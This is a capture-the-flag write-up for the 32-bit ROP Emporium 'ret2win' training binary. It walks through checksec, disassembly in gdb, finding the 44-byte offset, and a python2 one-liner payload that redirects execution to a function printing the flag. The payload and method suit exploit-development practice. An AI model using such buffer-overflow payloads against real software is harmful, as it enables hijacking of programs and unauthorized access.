### ret2win x86
Run the binary will see following message.

For my first trick, I will attempt to fit 56 bytes of user input into 32 bytes of stack buffer!
What could possibly go wrong?
You there, may I have your input please? And don't worry about null bytes, we're using read()!

It also tells us that there is a function named ret2win and will cat the flag.txt. Therefore,  we only need to overwrite the return address to the address of the syscall in ret2win function.
Use gdb to gather information.
```
gdb ./ret2win32
```
Check the security of ret2win32.
```
gdb$ checksec

```
```
CANARY    : disabled
FORTIFY   : disabled
NX        : ENABLED
PIE       : disabled
RELRO     : Partial
```
No canary, no pie.
List all functions.
```
gdb$ info functions
```
```
...
0x08048546  main
0x080485ad  pwnme
0x0804862c  ret2win
...
```
There is indeed a function called ret2win.

Disassembly ret2win to obtain the return address.
```
gdb$ disas ret2win 
```
```
...
0x08048645 <+25>:    push   0x8048813
0x0804864a <+30>:    call   0x80483e0 <system@plt>
...
```
The address of the syscall is 0x08048645.

Overflow length will be 32 bytes(buffer) + 4 bytes (RBP) = 36 bytes.

Therefore, the overflow strings will be:
```
A'*36+'\x45\x86\x04\x08'
```
Run the program with overflow strings:
```
python2 -c "print 'A'*36+'\x45\x86\x04\x08'" | ./ret2win32
```
It will get wrong answer, so we need to find correct overflow length.

Disassambly pwnme function.
```
gdb$ pwnme
```
```
...
0x08048611 <+100>:   call   0x80483b0 <read@plt>
0x08048616 <+105>:   add    esp,0x10
0x08048619 <+108>:   sub    esp,0xc
0x0804861c <+111>:   push   0x80487eb
0x08048621 <+116>:   call   0x80483d0 <puts@plt>
0x08048626 <+121>:   add    esp,0x10
0x08048629 <+124>:   nop
0x0804862a <+125>:   leave
0x0804862b <+126>:   ret

```
Set the breakpoints right after read call and return.
```
gdb$ b * 0x08048616
gdb$ b * 0x0804862b
```
Run the program.
```
gdb$ r
```
Input some characters, such as aaaaaaaaa.
```
>aaaaaaaaaa
```
Process will pause at breakpoint 1, and we can see the buffer's starting address in stack.
```
...
0008| 0xffffd4d8 --> 0x38 ('8')
0012| 0xffffd4dc --> 0x4
0016| 0xffffd4e0 ('a' <repeats 17 times>, "\n")
...
```
We run the process continuely, and we will see the return address in stack.
```
gdb$ c
```
```
0000| 0xffffd50c --> 0x8048590 (<main+74>:      sub    esp,0xc)
...
```
Now, we know the overflow length is0xffffd50c - 0xffffd4e0 = 0x2c = 44.

Therefore, the overflow strings will be:
```
A'*44+'\x45\x86\x04\x08'
```
Run the program with overflow strings:
```
python2 -c "print 'A'*44+'\x45\x86\x04\x08'" | ./ret2win32
```
It will show the flag:
```
ROPE{a_placeholder_32byte_flag!}
```
